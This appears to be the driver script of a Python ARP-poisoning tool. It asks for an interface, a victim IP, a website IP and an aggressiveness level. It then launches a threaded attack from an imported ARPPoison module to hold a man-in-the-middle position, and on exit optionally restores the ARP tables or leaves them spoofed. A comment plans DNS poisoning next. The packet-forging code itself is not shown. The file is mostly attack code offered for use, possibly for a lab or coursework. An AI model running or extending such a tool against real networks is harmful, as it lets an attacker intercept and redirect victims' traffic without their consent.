from arp_poisoning import ARPPoison
import scapy.all as scapy
import logging
import threading
import time

def setup():
    # Setup ARP Poisoning
    scapy.conf.verb = 0
    logging.getLogger("scapy").setLevel(logging.ERROR)
    try:
        iface = input("> Interface: ")
        victim = input("> Victim IP: ")
        site = input("> Website IP: ")
        while True:
            try:
                timer = int(input("> Aggressiveness (1-10): "))
                if 1 <= timer <= 10:
                    break
                else:
                    print(">! Integer must be between 1 and 10.")
            except ValueError:
                print(">! Please enter an integer.")
    except KeyboardInterrupt:
        print("> Poisoning aborted. Exiting...")
        exit(0)

    # TODO Setup and run DNS Poisoning
    return iface, victim, site, timer

def run(iface, victim, site, timer):
    # Execute ARP Poisoning in a separate thread to maintain MitM position
    arp = ARPPoison(iface, victim, site)
    stop_event = threading.Event()
    arp_thread = threading.Thread(
        target=arp.attack,
        args=(timer, stop_event,),
    )
    arp_thread.start()
    print("> ARP Poisoning started.")

    # Keep main thread alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        stop_event.set()
        arp_thread.join()
        restore = input("> Restore ARP tables? [Y/N] ").strip().lower()
        if restore == 'y' or restore == 'yes':
            arp.restore_tables(arp.victimIP, arp.websiteIP, arp.victimMAC, arp.websiteMAC)
        else:
            print("> ARP tables left spoofed. Exiting...")
            exit(0)

if __name__ == "__main__":
    iface, victim, site, timer = setup()
    run(iface, victim, site, timer)